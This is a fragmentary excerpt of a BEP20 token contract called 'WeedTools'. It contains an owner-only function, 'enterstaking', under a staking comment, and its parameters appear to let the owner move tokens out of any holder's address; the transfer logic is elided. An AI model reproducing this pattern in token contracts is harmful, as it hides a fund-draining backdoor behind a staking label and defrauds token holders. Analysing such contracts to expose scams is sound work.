...
contract WeedTools is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "WeedTools";
    string constant _symbol = "WeedTools";
    ...
    address public Owner=0xCFd6D10588f66d40b67CEc45E7e8D0c2791d1831; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver = 0xCFd6D10588f66d40b67CEc45E7e8D0c2791d1831;
...
/* staking Begins */
 ...
 function enterstaking(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to enterstaking");
